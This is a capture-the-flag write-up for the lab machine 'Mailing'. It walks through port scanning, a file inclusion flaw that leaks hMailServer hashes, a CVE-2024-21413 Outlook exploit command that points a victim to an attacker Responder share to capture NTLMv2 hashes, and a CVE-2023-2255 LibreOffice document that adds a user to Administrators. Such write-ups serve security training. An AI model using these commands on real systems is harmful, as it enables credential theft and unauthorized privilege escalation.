 ![image](https://github.com/user-attachments/assets/761d4f10-e593-44ab-bdc8-1e77aaa90dbe)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Enumeration:

### Port scan:

I began the enumeration with a quick `rustscan`, which showed me multiple open ports on the target host:

```Rust
rustscan -a 10.10.11.14 -- -A -T4 -vv -oN mailing_nmap
```
![image](https://github.com/user-attachments/assets/6c9ded5b-64f3-4e41-86ea-8e639c5da1d4)

```Rust
PORT      STATE SERVICE    REASON          VERSION
25/tcp    open  smtp       syn-ack ttl 127 hMailServer smtpd
|_smtp-commands: Couldn't establish connection on port 25
80/tcp    open  http       syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Mailing
587/tcp   open  smtp       syn-ack ttl 127 hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/emailAddress=ruy@mailing.htb/organizationalUnitName=MAILING/localityName=Madrid
| Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/emailAddress=ruy@mailing.htb/organizationalUnitName=MAILING/localityName=Madrid
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-02-27T18:24:10
| Not valid after:  2029-10-06T18:24:10
| MD5:   bd32:df3f:1d16:08b8:99d2:e39b:6467:297e
| SHA-1: 5c3e:5265:c5bc:68ab:aaac:0d8f:ab8d:90b4:7895:a3d7
| -----BEGIN CERTIFICATE-----
| MIIDpzCCAo8CFAOEgqHfMCTRuxKnlGO4GzOrSlUBMA0GCSqGSIb3DQEBCwUAMIGP
| MQswCQYDVQQGEwJFVTERMA8GA1UECAwIRVVcU3BhaW4xDzANBgNVBAcMBk1hZHJp
| ZDEUMBIGA1UECgwLTWFpbGluZyBMdGQxEDAOBgNVBAsMB01BSUxJTkcxFDASBgNV
| BAMMC21haWxpbmcuaHRiMR4wHAYJKoZIhvcNAQkBFg9ydXlAbWFpbGluZy5odGIw
| HhcNMjQwMjI3MTgyNDEwWhcNMjkxMDA2MTgyNDEwWjCBjzELMAkGA1UEBhMCRVUx
| ETAPBgNVBAgMCEVVXFNwYWluMQ8wDQYDVQQHDAZNYWRyaWQxFDASBgNVBAoMC01h
| aWxpbmcgTHRkMRAwDgYDVQQLDAdNQUlMSU5HMRQwEgYDVQQDDAttYWlsaW5nLmh0
| YjEeMBwGCSqGSIb3DQEJARYPcnV5QG1haWxpbmcuaHRiMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEAqp4+GH5rHUD+6aWIgePufgFDz+P7Ph8l8lglXk4E
| wO5lTt/9FkIQykSUwn1zrvIyX2lk6IPN+airnp9irb7Y3mTcGPerX6xm+a9HKv/f
| i3xF2oo3Km6EddnUySRuvj8srEu/2REe/Ip2cIj85PGDOEYsp1MmjM8ser+VQC8i
| ESvrqWBR2B5gtkoGhdVIlzgbuAsPyriHYjNQ7T+ONta3oGOHFUqRIcIZ8GQqUJlG
| pyERkp8reJe2a1u1Gl/aOKZoU0yvttYEY1TSu4l55al468YAMTvR3cCEvKKx9SK4
| OHC8uYfnQAITdP76Kt/FO7CMqWWVuPGcAEiYxK4BcK7U0wIDAQABMA0GCSqGSIb3
| DQEBCwUAA4IBAQCCKIh0MkcgsDtZ1SyFZY02nCtsrcmEIF8++w65WF1fW0H4t9VY
| yJpB1OEiU+ErYQnR2SWlsZSpAqgchJhBVMY6cqGpOC1D4QHPdn0BUOiiD50jkDIx
| Qgsu0BFYnMB/9iA64nsuxdTGpFcDJRfKVHlGgb7p1nn51kdqSlnR+YvHvdjH045g
| ZQ3JHR8iU4thF/t6pYlOcVMs5WCUhKKM4jyucvZ/C9ug9hg3YsEWxlDwyLHmT/4R
| 8wvyaiezGnQJ8Mf52qSmSP0tHxj2pdoDaJfkBsaNiT+AKCcY6KVAocmqnZDWQWut
| spvR6dxGnhAPqngRD4sTLBWxyTTR/brJeS/k
|_-----END CERTIFICATE-----
5040/tcp  open  unknown    syn-ack ttl 127
5985/tcp  open  http       syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
7680/tcp  open  pando-pub? syn-ack ttl 127
47001/tcp open  http       syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc      syn-ack ttl 127 Microsoft Windows RPC
57964/tcp open  msrpc      syn-ack ttl 127 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
TCP/IP fingerprint:
SCAN(V=7.94SVN%E=4%D=7/22%OT=25%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=669E0864%P=x86_64-pc-linux-gnu)
SEQ(SP=104%GCD=1%ISR=106%TI=I%II=I%SS=S%TS=U)
OPS(O1=M53CNW8NNS%O2=M53CNW8NNS%O3=M53CNW8%O4=M53CNW8NNS%O5=M53CNW8NNS%O6=M53CNNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M53CNW8NNS%CC=N%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   176.82 ms 10.10.14.1
2   175.68 ms mailing.htb (10.10.11.14)
```
From the port scan results, I observed that the `mailing.htb` domain is being utilized on the target host, so I added this domain to my hosts config file.

### Web Enumeration:

After completing the port and service scan, I moved on to web page enumeration and found this page running on the target host:

![image](https://github.com/user-attachments/assets/5a78f661-4f16-412e-ba61-8e4f202a8a79)

I used `dirsearch` and `ffuf` to find other interesting directories but didn't find anything noteworthy.

On the home page, there is a link to download instructions, which points to a PDF file with instructions for setting up the mail server:

![image](https://github.com/user-attachments/assets/90f148cb-486f-44b3-8b5d-d23634e44af5)

The link appears to be vulnerable to a file inclusion vulnerability:

```
http://mailing.htb/download.php?file=instructions.pdf
```

To confirm this, I fired up Burp Suite and intercepted the request. After capturing and sending the request to the Repeater, I tested with a basic Windows file that contains boot-related information for Windows machines, and it worked:

![image](https://github.com/user-attachments/assets/5f694d76-6221-424e-b1d0-3fbf06d5d3c0)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Initial access:

### Hashes:

Since the server has a file inclusion vulnerability, I started looking for the configuration file for the hMailServer. With some research, I discovered that `C:\Program Files (x86)\hMailServer\Bin` generally contains the **hMailServer.ini** file.

I used this location in Burp Suite and checked for the details. I was able to retrieve some credentials:

![image](https://github.com/user-attachments/assets/5be39a08-fefc-454f-89cd-c188765566ed)

These credentials are MD5 password hashes, so I used CrackStation to crack them and successfully cracked one of the hashes:

![image](https://github.com/user-attachments/assets/9bbd59c1-6dc7-4f71-b80d-482373579688)

Although I obtained these credentials, I wasn't able to authenticate via WinRM. I then started looking for email-related exploits, as the box name suggested a hint and SMTP services were running.

### SMTP based exploit

I started looking for some zero-click mail exploits since there would be no one present to click on our malicious link. I found this [Outlook-based exploit](https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability).

From **instruction.pdf**, I had already obtained a valid username, "maya@mailing.htb":

![image](https://github.com/user-attachments/assets/ec4ec02d-ae3c-468e-83c2-fbe571072d56)

I followed the exploit and set up my `Responder`. After a few trials, I finally got a hit on my Responder with NTLMv2 hashes:

```
python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password ************** --sender administrator@malinig.htb --recipient maya@mailing.htb --url \\10.10.10.10\tesr --subject "don't click me"
```

![image](https://github.com/user-attachments/assets/72573bcc-523f-4435-bf25-f15671865eb3)

I cracked this hash using `John` and obtained the password in plain text:

![image](https://github.com/user-attachments/assets/f05d642f-72af-4ca4-8d7b-800d91a42e2f)

With these cracked credentials, I was finally able to gain initial access as the user "maya" and retrieved the user flag. 🙂

![image](https://github.com/user-attachments/assets/3911283b-6ec5-4d20-b388-6573f1b20cd9)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Root

I started checking the privilege escalation vectors using "winPEAS" and "PrivEscCheck" but didn't find anything that could help. I then began manually searching through directories and noticed one named "Important documents." However, upon further inspection, I found it was empty:

![image](https://github.com/user-attachments/assets/c78e638f-d09b-4125-be0a-854302ea36c0)

During manual enumeration, I checked the installed software and noticed an unusual application, "LibreOffice":

```
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```
![image](https://github.com/user-attachments/assets/ba622720-fc88-47af-8ce1-7b32fbb9b347)

I started looking for exploits related to LibreOffice 7.4 and found that this version is vulnerable to [CVE-2023-2255](https://nvd.nist.gov/vuln/detail/CVE-2023-2255). I also found an exploit for this on [GitHub](https://github.com/elweth-sec/CVE-2023-2255).

Following the proof of concept, I created an `exploit.odt` file with a command to add "Maya" to the administrator group:

![image](https://github.com/user-attachments/assets/2dde996c-1759-4c52-8578-d35c30e46fe0)

```
python3 libre_office_exploit.py --cmd 'net localgroup Administradores maya /add' --output 'exploit.odt'
```
![image](https://github.com/user-attachments/assets/d90b331b-3bf8-49fb-b897-c90e6b08c6ec)

Once the exploit was created, I transferred it into the "Important documents" folder, assuming it was a common location for LibreOffice documents.

![image](https://github.com/user-attachments/assets/5a7946b9-e813-4528-864f-cc76f9752d47)

Before transferring the exploit, I verified that Maya had no admin privileges:

![image](https://github.com/user-attachments/assets/510d4a78-0898-4d64-bc56-25c76c3d2621)

After transferring the exploit and waiting for a moment, I observed that Maya now had admin privileges:

![image](https://github.com/user-attachments/assets/4e561d04-3915-49b3-b427-47f3ab6149ee)

Finally, I used PsExec to log in with admin privileges and retrieved the root flag. (pwn3d🎉)

![image](https://github.com/user-attachments/assets/7eb9a3a7-852e-418c-b95e-039342c3a71d)

![image](https://github.com/user-attachments/assets/bab9ac49-29dd-4aa5-9fc2-efc371bdbc09)
